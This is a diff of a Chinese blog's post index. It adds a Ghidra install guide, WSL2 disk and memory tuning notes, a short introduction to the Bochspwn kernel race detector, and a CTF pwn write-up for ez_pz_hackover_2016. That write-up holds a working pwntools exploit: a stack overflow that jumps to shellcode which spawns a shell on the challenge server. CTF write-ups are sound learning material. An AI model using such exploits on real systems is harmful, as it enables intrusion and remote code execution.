+<h2 id="安装Ghidra"><a href="#安装Ghidra" class="headerlink" title="安装Ghidra"></a>安装Ghidra</h2><p>首先，确保你有JRE（Java运行时环境）和Jdk（Java开发工具包）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
+
+<p>如果没有，则使用以下命令安装，注意选择最新版openjdk安装，使用<code>apt-cache</code>搜索即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openjdk-21-jre</span><br><span class="line">sudo apt install openjdk-21-jdk</span><br></pre></td></tr></table></figure>
+
+<p>安装最新版<a href="https://github.com/NationalSecurityAgency/ghidra/releases">ghidra</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.2.1_build/ghidra_11.2.1_PUBLIC_20241105.zip</span><br><span class="line">unzip ghidra_11.2.1_PUBLIC_20241105.zip</span><br><span class="line">cd ghidra_11.2.1_PUBLIC/</span><br><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure>
+
+<p>如果要设置jdk路径，<code>/usr/lib/jvm/java-21-openjdk-amd64/</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br><span class="line">******************************************************************</span><br><span class="line">JDK 21+ (64-bit) could not be found and must be manually chosen!</span><br><span class="line">******************************************************************</span><br><span class="line">Enter path to JDK home directory (ENTER for dialog): /usr/lib/jvm/java-21-openjdk-amd64/</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以正常打开GUI界面了。</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【ciscn_2019_es_2】WriteUp</title>
     <url>/posts/d92ba103.html</url>
     <content><![CDATA[<p><code>checksec</code>一下，发现只有NX防护。</p>
@@ -2274,6 +2393,89 @@
       <tags>
         <tag>Pwn</tag>
         <tag>栈迁移</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WSL2优化</title>
+    <url>/posts/b3366d9a.html</url>
+    <content><![CDATA[<p>将WSL2的一些优化过程记录在这里（在想这些优化类的要么搞个分类，要么搞个时间轴，可能效果会更好）</p>
+<h2 id="终端美化"><a href="#终端美化" class="headerlink" title="终端美化"></a>终端美化</h2><p>不想多说啥，</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 安装oh-my-zsh</li>
+<li><input checked="" disabled="" type="checkbox"> 配置power10k主题，命令高亮和自动补全插件</li>
+<li><input checked="" disabled="" type="checkbox"> 安装JetBrains Mono字体</li>
+</ul>
+<h2 id="磁盘占用优化"><a href="#磁盘占用优化" class="headerlink" title="磁盘占用优化"></a>磁盘占用优化</h2><p>参考链接：</p>
+<ul>
+<li><a href="https://devblogs.microsoft.com/commandline/windows-subsystem-for-linux-september-2023-update/#automatic-disk-space-clean-up-set-sparse-vhd">Windows Subsystem for Linux September 2023 update</a></li>
+<li><a href="https://superuser.com/questions/1827953/reclaim-wsl2-disk-space-after-setting-it-to-sparse">Reclaim WSL2 disk space after setting it to sparse</a></li>
+</ul>
+<p>日常使用WSL时，随着文件的不断创建与删除，WSL虚拟磁盘的体积会逐渐增大，甚至在删除文件后磁盘空间不会减小（笔者在最近几周频繁使用，直接从二十G翻倍到四十G~）。通过开启<strong>Sparse VHD</strong>（稀疏VHD）的方法，来使虚拟磁盘自动释放未使用的空间。</p>
+<h3 id="启用Sparse-VHD功能"><a href="#启用Sparse-VHD功能" class="headerlink" title="启用Sparse VHD功能"></a>启用Sparse VHD功能</h3><ol>
+<li><p><strong>编辑<code>.wslconfig</code>文件</strong>（在windows用户主目录下，没有的话需要创建），添加以下内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">sparseVhd=true</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关闭WSL</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>为指定WSL发行版启用Sparse VHD</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl --manage ubuntu22.04 --set-sparse true</span><br></pre></td></tr></table></figure>
+
+<p>该命令只需运行一次，之后会默认保持启用状态。</p>
+</li>
+</ol>
+<p>如果发现ext4.vhdx没有减小，则需要手动压缩磁盘（管理员运行powershell）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br><span class="line">wsl <span class="literal">--manage</span> ubuntu22.<span class="number">04</span> <span class="literal">--set-sparse</span> false</span><br><span class="line"><span class="built_in">optimize-vhd</span> <span class="literal">-Path</span> &lt;path<span class="literal">-to-your-vhdx</span>&gt;.vhdx <span class="literal">-Mode</span> full</span><br><span class="line">wsl <span class="literal">--manage</span> ubuntu22.<span class="number">04</span> <span class="literal">--set-sparse</span> true</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="验证功能是否启用"><a href="#验证功能是否启用" class="headerlink" title="验证功能是否启用"></a>验证功能是否启用</h3><p>检查WSL磁盘文件（<code>ext4.vhdx</code>）是否减小</p>
+<p>文件通常路径：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\&lt;YourUsername&gt;\AppData\Local\Packages\&lt;DistroPackage&gt;\LocalState\ext4.vhdx</span><br></pre></td></tr></table></figure>
+
+<p><strong>启动前</strong></p>
+<p><img src="/images/2024-11-11-WSL2%E4%BC%98%E5%8C%96.assets/image-20241111102727466.png" alt="image-20241111102727466"></p>
+<p><strong>启动后</strong></p>
+<p><img src="/images/2024-11-11-WSL2%E4%BC%98%E5%8C%96.assets/image-20241111104042189.png" alt="image-20241111104042189"></p>
+<h2 id="扩大内存"><a href="#扩大内存" class="headerlink" title="扩大内存"></a>扩大内存</h2><p>参考链接：<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-setting-for-wslconfig">Advanced settings configuration in WSL</a></p>
+<p>WSL2默认只占用windows的一半内存，这里扩展到100%</p>
+<p>编辑<code>.wslconfig</code>，添加以下内容：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">memory=32GB</span><br></pre></td></tr></table></figure>
+
+<p>然后重启WSL2即可</p>
+]]></content>
+      <tags>
+        <tag>WSL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bochspwn学习</title>
+    <url>/posts/96f187a0.html</url>
+    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
+<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
+]]></content>
+      <tags>
+        <tag>论文复现</tag>
+        <tag>内核</tag>
+        <tag>条件竞争</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【ez_pz_hackover_2016】WriteUp</title>
+    <url>/posts/478cb6ca.html</url>
+    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>Pwn</tag>
+        <tag>Ret2Shellcode</tag>
       </tags>
   </entry>
   <entry>
@@ -2344,36 +2546,6 @@
 ]]></content>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【ez_pz_hackover_2016】WriteUp</title>
-    <url>/posts/478cb6ca.html</url>
-    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
-<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>构造exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>Pwn</tag>
-        <tag>Ret2Shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bochspwn学习</title>
-    <url>/posts/96f187a0.html</url>
-    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
-<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
-]]></content>
-      <tags>
-        <tag>论文复现</tag>
-        <tag>内核</tag>
-        <tag>条件竞争</tag>
       </tags>
   </entry>
   <entry>
